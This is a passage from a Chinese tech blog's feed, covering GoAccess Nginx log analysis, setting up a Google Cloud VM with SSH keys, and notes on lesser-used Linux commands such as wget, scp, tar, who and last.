class="line">36.113.128.155 - - [28&#x2F;Apr&#x2F;2019:02:20:01 +0000] &quot;GET &#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html HTTP&#x2F;1.1&quot; 200 7798 &quot;http:&#x2F;&#x2F;www.692213.com&#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html&quot; &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.110 Safari&#x2F;537.36&quot;</span><br></pre></td></tr></table></figure><p>方式一，配置<code>.goaccessrc</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim ~&#x2F;.goaccessrc</span><br><span class="line"></span><br><span class="line">time-format %T</span><br><span class="line">date-format %d&#x2F;%b&#x2F;%Y</span><br><span class="line">log_format %h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^</span><br></pre></td></tr></table></figure><p>方式二，在命令行传递参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess nginx&#x2F;access.log --log-format&#x3D;&#39;%h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^&#39; --date-format&#x3D;%d&#x2F;%b&#x2F;%Y --time-format&#x3D;%T</span><br></pre></td></tr></table></figure><blockquote><p>注意：无论是配置文件还是命令行参数 都不是永远不变的，只是相对于你要监控的日志格式。</p></blockquote><h3 id="运行GoAccess"><a href="#运行GoAccess" class="headerlink" title="运行GoAccess"></a>运行GoAccess</h3><p>方式一，通过<code>-p</code>参数，指定配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess nginx&#x2F;access.log  -p ~&#x2F;.goaccessrc</span><br></pre></td></tr></table></figure><p>方式二，直接在命令行参数中指定日志格式，详情见上面的例子。</p><h4 id="终端输出"><a href="#终端输出" class="headerlink" title="终端输出"></a>终端输出</h4><p>以下提示使用预定义日志格式的日志配置对话框供您选择，然后实时显示统计信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess nginx&#x2F;access.log -c</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827144401.png" alt=""></p><p>通常选择第三个，通用日志格式（CLF），成功之后就是这样个样子：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827151540.png" alt=""></p><p>控制台下的操作方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">* F1或h主要帮助。</span><br><span class="line">* F5重绘主窗口。</span><br><span class="line">* q退出程序，当前窗口或折叠活动模块</span><br><span class="line">* o或ENTER展开所选模块或打开窗口</span><br><span class="line">* 0-9并将Shift + 0所选模块设置为活动状态</span><br><span class="line">* j在展开的模块中向下滚动</span><br><span class="line">* k在扩展模块中向上滚动</span><br><span class="line">* c设置或更改方案颜色</span><br><span class="line">* ^ f在活动模块中向前滚动一个屏幕</span><br><span class="line">* ^ b在活动模块中向后滚动一个屏幕</span><br><span class="line">* TAB迭代模块（转发）</span><br><span class="line">* SHIFT + TAB迭代模块（向后）</span><br><span class="line">* s对活动模块的排序选项</span><br><span class="line">* &#x2F;搜索所有模块（允许正则表达式）</span><br><span class="line">* n找到下一个出现的位置</span><br><span class="line">* g移至屏幕的第一个项目或顶部</span><br><span class="line">* G移动到屏幕的最后一项或底部</span><br></pre></td></tr></table></figure><h4 id="静态HTML-输出"><a href="#静态HTML-输出" class="headerlink" title="静态HTML 输出"></a>静态HTML 输出</h4><p>以下内容分析访问日志并在静态HTML报告中显示统计信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html</span><br></pre></td></tr></table></figure><h4 id="实时HTML-输出"><a href="#实时HTML-输出" class="headerlink" title="实时HTML 输出"></a>实时HTML 输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html --real-time-html</span><br></pre></td></tr></table></figure><p>然后用浏览器访问，大概就是这个样子：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827151617.png" alt=""></p><h4 id="配置文件及日志格式说明"><a href="#配置文件及日志格式说明" class="headerlink" title="配置文件及日志格式说明"></a>配置文件及日志格式说明</h4><p>GoAccess 的配置文件位于<code>%sysconfdir%/goaccess.conf</code>或<code>~/.goaccessrc</code></p><blockquote><p>其中，%sysconfdir%是 /etc/，/usr/etc/ 或 /usr/local/etc/</p></blockquote><p><code>time-format</code>和<code>date-format</code>的格式通常都是固定的，只有<code>log-format</code>的格式视具体日志格式而定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">time-format %T</span><br><span class="line"></span><br><span class="line">date-format %d&#x2F;%b&#x2F;%Y</span><br></pre></td></tr></table></figure><p><code>log-format</code>常用格式说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">* %x与时间格式和日期格式变量匹配的日期和时间字段。当给出时间戳而不是日期和时间在两个单独的变量中时使用。</span><br><span class="line">* %t时间字段匹配时间格式变量。</span><br><span class="line">* %d与日期格式变量匹配的日期字段。</span><br><span class="line">* %v服务器名称根据规范名称设置（服务器块或虚拟主机）。</span><br><span class="line">* %e这是HTTP身份验证确定的请求文档的人的用户标识。</span><br><span class="line">* %hhost（客户端IP地址，IPv4或IPv6）</span><br><span class="line">* %r来自客户端的请求行。这需要围绕请求的特定分隔符（单引号，双引号等）可解析。否则，使用特殊的格式说明符，如组合%m，%U，%q和%H解析各个字段。</span><br><span class="line">注意：使用或者%r获得完整的请求OR %m，%U，%q并%H形成你的要求，不要同时使用。</span><br><span class="line">* %m请求方法。</span><br><span class="line">* %U请求的URL路径。</span><br><span class="line">注意：如果查询字符串在%U，则无需使用%q。但是，如果URL路径不包含任何查询字符串，则可以使用%q并将查询字符串附加到请求中。</span><br><span class="line">* %q查询字符串。</span><br><span class="line">* %H请求协议。</span><br><span class="line">* %s服务器发送回客户端的状态代码。</span><br><span class="line">* %b返回给客户端的对象大小。</span><br><span class="line">* %R“Referer”HTTP请求标头。</span><br><span class="line">* %u用户代理HTTP请求标头。</span><br><span class="line">* %D服务请求所需的时间，以微秒为单位。</span><br><span class="line">* %T服务请求所需的时间，以毫秒为单位，分辨率为毫秒。</span><br><span class="line">* %L 服务请求所用的时间，以毫秒为单位的十进制数。</span><br><span class="line">* %^忽略此字段。</span><br><span class="line">* %~向前移动日志字符串，直到找到非空格（！isspace）char。</span><br><span class="line">* ~h X-Forwarded-For（XFF）字段中的主机（客户端IP地址，IPv4或IPv6）。</span><br></pre></td></tr></table></figure><h4 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h4><ul><li><code>-f</code>：指定需要分析的日志文件路径</li><li><code>-c</code>：程序启动时提示日志/日期配置窗口</li><li><code>-p</code>：指定要使用的自定义配置文件</li><li><code>-d</code>：在HTML或JSON输出上启用IP解析器</li><li><code>-o</code>：输出到指定扩展名文件中（Html、Json、CSV）</li><li><code>-a</code>：按主机启用用户代理列表。为了更快地解析，请不要启用此标志</li><li><code>-d</code>：在HTML或JSON输出上启用IP解析器。</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://goaccess.io/" target="_blank" rel="noopener">GoAccess 官网</a></li><li><a href="https://goaccess.io/get-started" target="_blank" rel="noopener">GoAccess 入门</a></li><li><a href="https://www.jianshu.com/p/c6310332f411" target="_blank" rel="noopener">使用GoAccess 分析Nginx 日志</a></li><li><a href="https://github.com/stockrt/nginx2goaccess" target="_blank" rel="noopener">将Nginx log_format转换为goaccess配置文件</a></li><li><a href="https://serverfault.com/questions/779405/goaccess-date-time-log-format-error" target="_blank" rel="noopener">GoAccess 日志格式转换案例一</a></li><li><a href="https://github.com/allinurl/goaccess/issues/1244" target="_blank" rel="noopener">GoAccess 日志格式转换案例二</a></li><li><a href="https://github.com/allinurl/goaccess/issues/668" target="_blank" rel="noopener">GoAccess 日志格式转换案例三</a></li><li><a href="https://github.com/allinurl/goaccess/issues/1338" target="_blank" rel="noopener">GoAccess 日志格式转换案例四</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在最近发生那件事情之前，&lt;strong&gt;日志&lt;/strong&gt;很少能引起我的重视，导致往往出现什么问题，第一时间并不是去看日志。&lt;/p&gt;</summary>
    
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/categories/Nginx/"/>
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/tags/Nginx/"/>
    
    <category term="GoAccess" scheme="https://www.0x2beace.com/tags/GoAccess/"/>
    
    <category term="Logs" scheme="https://www.0x2beace.com/tags/Logs/"/>
    
  </entry>
  
  <entry>
    <title>手把手教你如何创建启动 Google Cloud 实例</title>
    <link href="https://www.0x2beace.com/teach-you-how-to-create-and-start-a-google-cloud-instance/"/>
    <id>https://www.0x2beace.com/teach-you-how-to-create-and-start-a-google-cloud-instance/</id>
    <published>2020-08-26T15:25:21.000Z</published>
    <updated>2020-08-27T06:27:35.489Z</updated>
    
    <content type="html"><![CDATA[<p>最近需要在Google Cloud 上重新开一台Hk区的服务器，所以写这篇笔记用来记录操作过程。</p><a id="more"></a><h2 id="创建VM-实例"><a href="#创建VM-实例" class="headerlink" title="创建VM 实例"></a>创建VM 实例</h2><ul><li><a href="https://cloud.google.com/" target="_blank" rel="noopener">Google Cloud 官网</a></li><li><a href="https://console.cloud.google.com/" target="_blank" rel="noopener">Google Cloud Platform 控制台</a></li></ul><p>进入控制台，找到 Compute Engine，点击创建实例。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142145.png" alt=""></p><p>新建虚拟机实例，选择相应的配置。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142211.png" alt=""></p><p>选择操作系统映像，以及磁盘大小。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142232.png" alt=""></p><p>基本配置如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142253.png" alt=""></p><p>然后点击创建就可以了。创建成功之后，就可以看到该服务器的IP地址了。</p><p>这里需要注意的是，Google Cloud 的远程连接SSH 的方式与其他平台有所区别。</p><h2 id="创建SSH-连接"><a href="#创建SSH-连接" class="headerlink" title="创建SSH 连接"></a>创建SSH 连接</h2><p>Compute Engine =》元数据 =》SSH 密钥</p><p>找到修改，然后上传你的 SSH Key。</p><p>不知道SSH Key 是什么？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa</span><br><span class="line"># 打开终端，输入上面那个命令</span><br><span class="line"># 然后在~&#x2F;.ssh 目录下会生成一个 公钥和私钥</span><br><span class="line"># 将 .pub 结尾的文件打开，复制其中的值，粘贴到Google Cloud 上就可以了。</span><br></pre></td></tr></table></figure><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>使用<code>ssh -i max@35.241.77.3</code> 命令连接，其中 max 是用户名，后面是对应服务器 ip地址。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142317.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://cloud.google.com/compute/docs/quickstart-linux" target="_blank" rel="noopener">开启Linux 虚拟机使用快速入门–官网文档</a></li><li><a href="https://zhuanlan.zhihu.com/p/40983101" target="_blank" rel="noopener">GCP（Google Cloud Platform）入门</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近需要在Google Cloud 上重新开一台Hk区的服务器，所以写这篇笔记用来记录操作过程。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Linux/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="云" scheme="https://www.0x2beace.com/tags/%E4%BA%91/"/>
    
  </entry>
  
  <entry>
    <title>不常用Linux命令</title>
    <link href="https://www.0x2beace.com/not-commonly-used-linux-commands/"/>
    <id>https://www.0x2beace.com/not-commonly-used-linux-commands/</id>
    <published>2020-08-25T12:53:33.000Z</published>
    <updated>2020-08-25T12:54:50.257Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记的目的是记录那些不太常用但却很实用的 Linux 命令。</p><a id="more"></a><h2 id="Wget"><a href="#Wget" class="headerlink" title="Wget"></a>Wget</h2><p>wget 命令用于文件的下载，</p><h5 id="下载单个文件"><a href="#下载单个文件" class="headerlink" title="下载单个文件"></a>下载单个文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 下载Ubuntu 18.04 桌面版和服务端版</span><br><span class="line">$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-live-server-amd64.iso</span><br><span class="line">$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-desktop-amd64.iso</span><br></pre></td></tr></table></figure><p>wget默认会以最后一个符合”/”的后面的字符来命令，对于动态链接的下载通常文件名会不正确。</p><p>为了解决这个问题，我们可以使用参数-O来指定一个文件名：</p><h5 id="下载单个文件并重命名"><a href="#下载单个文件并重命名" class="headerlink" title="下载单个文件并重命名"></a>下载单个文件并重命名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -O file.zip http:&#x2F;&#x2F;www.minjieren.com&#x2F;download.aspx?id&#x3D;1080</span><br></pre></td></tr></table></figure><h5 id="后台下载"><a href="#后台下载" class="headerlink" title="后台下载"></a>后台下载</h5><p>当需要下载比较大的文件时，使用参数<code>-b</code>可以隐藏在后台进行下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -b http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure><p>可以使用以下命令来察看下载进度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tail -f wget-log</span><br></pre></td></tr></table></figure><h2 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h2><h2 id="Scp"><a href="#Scp" class="headerlink" title="Scp"></a>Scp</h2><p>scp 命令用于文件传输，在不能使用 XShell 这类工具时，scp能很好的解决文件上传的问题。</p><h5 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ scp -r &#x2F;c&#x2F;User&#x2F;Desktop&#x2F;dirname username@34.92.117.222:&#x2F;tmp&#x2F;dirname</span><br></pre></td></tr></table></figure><h5 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$scp -r  Boo@34.92.117.222:&#x2F;tmp&#x2F;dirname &#x2F;c&#x2F;Users&#x2F;Boo&#x2F;Desktop&#x2F;dirname</span><br></pre></td></tr></table></figure><p>如果存在端口号：</p><p>注意：<code>-P</code>参数是大写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 58812 root@103.232.86.239:&#x2F;tmp&#x2F;runfast_0603.sql ~&#x2F;File&#x2F;</span><br></pre></td></tr></table></figure><p>其中 <code>-r</code> 参数表示目录，<code>username</code> 表示服务器对应用户，<code>@</code> 后面接服务器地址。</p><p>注意：不要直接使用 root 用户，因为总是会提示你权限不足。另外使用非 root 用户时，需要注意文件夹权限的问题。</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>zip 命令用于对文件进行打包处理，也就是我们常说的压缩。文件经压缩之后会生成一个具有<code>.zip</code>扩展名的压缩文件。</p><p>将当前目录的<code>dir</code>目录下的所有文件及文件夹压缩为 example.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r -q example.zip dir</span><br></pre></td></tr></table></figure><p>将当前目录下的所有文件及文件夹压缩为 example.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r -q *</span><br></pre></td></tr></table></figure><p>将指定文件目录的所有文件及文件夹压缩为 example.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r -q exmaple.zip &#x2F;tmp&#x2F;dir</span><br></pre></td></tr></table></figure><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>unzip 命令用于解压缩由 zip 命令压缩的“.zip”压缩包。</p><p>查看压缩文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -v dir.zip</span><br></pre></td></tr></table></figure><p>将压缩文件在当前目录下解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip example.zip</span><br></pre></td></tr></table></figure><p>将压缩文件<code>example.zip</code>在指定目录<code>/tmp</code>下解压缩，如果已有相同的文件存在，要求 unzip命令不覆盖原先的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -n example.zip -d &#x2F;tmp</span><br></pre></td></tr></table></figure><p>将压缩文件<code>example.zip</code>在当前目<code>dir</code>下解压，如果已有相同的文件，不询问，直接覆盖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -o example.zip -d</span><br></pre></td></tr></table></figure><p><code>-o</code> 参数表示不必先询问用户，unzip执行后覆盖原有的文件；<br><code>-d</code> 参数指定文件解压缩后所要存储的目录；<br><code>-n</code> 参数解压缩时不要覆盖原有的文件；</p><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><p>tar 命令可以为linux 文件和目录创建档案。</p><p>利用tar命令，可以把一大堆的文件和目录全部打包成一个文件。</p><p>需要明确的两个概念是：打包和压缩是不同的两件事。</p><ul><li>打包：是指将一大堆文件或目录变成一个总的文件；</li><li>压缩：则是将一个大文件通过压缩算法变成一个小文件。</li></ul><p>为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。</p><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><p>仅打包，不压缩。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -cvf test.tar 20200323.log</span><br></pre></td></tr></table></figure><p><code>test.tar</code>这个文件名是自定义的，只是习惯上我们使用<code>.tar</code>作为包文件。</p><h3 id="打包并压缩"><a href="#打包并压缩" class="headerlink" title="打包并压缩"></a>打包并压缩</h3><p>打包，且压缩。<code>-z</code>参数表示以<code>.tar.gz</code>或者<code>.tgz</code>后缀名代表<code>gzip</code>压缩过的<code>tar</code>包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zcvf test.tar.gz 20200323.log</span><br></pre></td></tr></table></figure><p>打包，且压缩。<code>-j</code>参数表示以<code>.tar.bz2</code>后缀名作为<code>tar</code>包名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -jcvf test.tar.bz2 20200323.log</span><br></pre></td></tr></table></figure><h3 id="查看包内容"><a href="#查看包内容" class="headerlink" title="查看包内容"></a>查看包内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -ztvf test.tar.gz</span><br></pre></td></tr></table></figure><p>因为使用<code>gzip</code>命令压缩的<code>test.tar.gz</code>，所以查看压缩包时需要加上<code>-z</code>参数。</p><blockquote><p>如何只解压部分文件？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -ztvf test.tar.gz 20200323.log</span><br></pre></td></tr></table></figure><p>这种方式仅限于取一个文件。</p><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><p>在该目录下直接解压：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf test.tar.gz</span><br></pre></td></tr></table></figure><p>解压至指定文件夹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf test.tar.gz -C log</span><br><span class="line">$ ls log</span><br><span class="line">20200323.log</span><br></pre></td></tr></table></figure><h2 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h2><p><code>.gz</code>压缩包（不带tar），需要使用gzip 命令去解压。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip test.gz -d &#x2F;&lt;filename&gt;</span><br></pre></td></tr></table></figure><p><code>-d</code> 参数用于指定解压位置</p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>如何查看Linux 的发行版本？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lsb_release -a</span><br></pre></td></tr></table></figure><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><p>crontab 命令被用来提交和管理用户的需要周期性执行的任务，与windows下的计划任务类似。</p><h2 id="w"><a href="#w" class="headerlink" title="w"></a>w</h2><p>w命令用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。</p><p>不带任何参数，会显示当前登入系统的所有用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ w</span><br><span class="line"> 10:54:39 up 14 days, 22:39, 2 users,  load average: 0.18, 0.09, 0.08</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">wangyh   pts&#x2F;0    113.87.129.118   10:27   25:10   2.77s  2.76s top</span><br><span class="line">Boo      pts&#x2F;1    113.87.129.118   10:54    1.00s  0.00s  0.00s w</span><br></pre></td></tr></table></figure><p>第一行显示的字段信息分别是：</p><ul><li><input checked="" disabled="" type="checkbox"> 10:50:39：系统当前时间</li><li><input checked="" disabled="" type="checkbox"> up 2:02： 系统已运行时间</li><li><input checked="" disabled="" type="checkbox"> 2 user：当前在线用户个数</li><li><input checked="" disabled="" type="checkbox"> load average：系统的平均负载，3个数值分别对应系统在过去的1,5,10分钟内的负载程度，数值越大，表明系统的负载越大。</li></ul><p>第二行几个字段分别表示：</p><ul><li><input checked="" disabled="" type="checkbox"> USER ： 登陆用户的账户名</li><li><input checked="" disabled="" type="checkbox"> TTY： 用户登陆所使用的终端</li><li><input checked="" disabled="" type="checkbox"> FROM： 显示用户从何处登陆，用户的IP地址</li><li><input checked="" disabled="" type="checkbox"> LOGIN@：显示用户登陆入系统时的时间</li><li><input checked="" disabled="" type="checkbox"> IDLE：用户空闲时长，从上一次该用户的任务结束后开始计时，以hour为单位</li><li><input checked="" disabled="" type="checkbox"> JCPU：表示在某段时间内，当前用户所有的进程任务所消耗的CPU时间</li><li><input checked="" disabled="" type="checkbox"> PCPU：表示在某段时间内，当前用户正在执行的进程任务所消耗的CPU时间</li><li><input checked="" disabled="" type="checkbox"> WHAT：表示用户正在执行的任务</li></ul><h2 id="who"><a href="#who" class="headerlink" title="who"></a>who</h2><p>who 命令用于查看目前登入系统的用户信息，与<code>w</code>命令类似。</p><p>显示当前登入系统中的所有用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ who</span><br><span class="line">wangyh   pts&#x2F;0        2019-04-19 10:27 (113.87.129.118)</span><br><span class="line">Boo      pts&#x2F;1        2019-04-19 10:54 (113.87.129.118)</span><br></pre></td></tr></table></figure><h4 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h4><p><code>-m</code>：效果等同于执行<code>whoami</code>命令<br><code>-q或--count</code>：只显示登入系统的帐号名称和总人数；<br><code>-H</code>：增加显示用户信息状态栏</p><h2 id="last"><a href="#last" class="headerlink" title="last"></a>last</h2><p>last 命令用于查看用户最近的登入信息</p><p>输出最后10 条登入信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ last -3</span><br><span class="line">Boo      pts&#x2F;1        113.87.129.118   Fri Apr 19 10:54   still logged in</span><br><span class="line">wangyh   pts&#x2F;0        113.87.129.118   Fri Apr 19 10:27   still logged in</span><br><span class="line">wangyh   pts&#x2F;5        113.87.129.118   Fri Apr 19 10:24 - 10:27  (00:02)</span><br></pre></td></tr></table></figure><p>查看指定用户的登入信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ last Boo -3</span><br><span class="line">Boo      pts&#x2F;1        113.87.129.118   Fri Apr 19 10:54   still logged in</span><br><span class="line">Boo      pts&#x2F;4        113.87.129.118   Fri Apr 19 10:23 - 10:26  (00:03)</span><br><span class="line">Boo      pts&#x2F;4        113.87.129.118   Fri Apr 19 10:14 - 10:22  (00:08)</span><br></pre></td></tr></table></figure><h2 id="pkill"><a href="#pkill" class="headerlink" title="pkill"></a>pkill</h2><p>pkill命令可以按照进程名杀死进程，可以用于踢出当前登入系统的用户。</p><h3 id="安全的踢出用户"><a href="#安全的踢出用户" class="headerlink" title="安全的踢出用户"></a>安全的踢出用户</h3><p>可以使用<code>pkill</code>命令踢出当前正登入系统中的用户，但是这么做很危险，更好的解决办法是：<br>先查看终端号，然后查看该终端执行的所有进程，根据进程号来停止服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef| grep pts&#x2F;0</span><br><span class="line">$ kill -9 pid</span><br></pre></td></tr></table></figure><h2 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h2><p>passwd 命令用于设置用户的认证信息，包括用户密码、密码过期时间等。</p><p>系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。</p><h2 id="ss"><a href="#ss" class="headerlink" title="ss"></a>ss</h2><p>ss 命令用来显示处于活动状态的套接字信息。ss 命令可以用来获取socket 